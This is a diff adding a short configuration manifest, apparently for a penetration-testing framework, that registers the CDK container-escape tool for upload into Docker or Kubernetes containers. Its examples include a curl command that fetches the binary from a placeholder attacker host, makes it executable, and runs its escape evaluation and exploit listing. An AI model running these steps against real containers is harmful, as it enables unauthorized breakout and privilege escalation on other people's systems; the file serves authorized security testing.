@@ -1,0 +1,22 @@
+schema = 1
+kind = "upload"
+description = "Checks a Docker or Kubernetes container for ways out of it, and tries them"
+tags = ["container", "docker", "kubernetes", "privesc", "linux"]
+upstream = "https://github.com/cdk-team/CDK"
+licence = "Apache-2.0"
+arch = "x86_64"
+examples = [
+  "curl http://{lhost}/cdk -o cdk && chmod +x cdk",
+  "./cdk evaluate --full",
+  "./cdk run --list",
+]
+
+[[upload]]
+path = "files/cdk"
+as = "cdk"
+note = "Linux x86_64"
+
+[[upload]]
+path = "files/cdk_thin"
+as = "cdk_thin"
+note = "Linux x86_64, smaller, without the Kubernetes exploits"
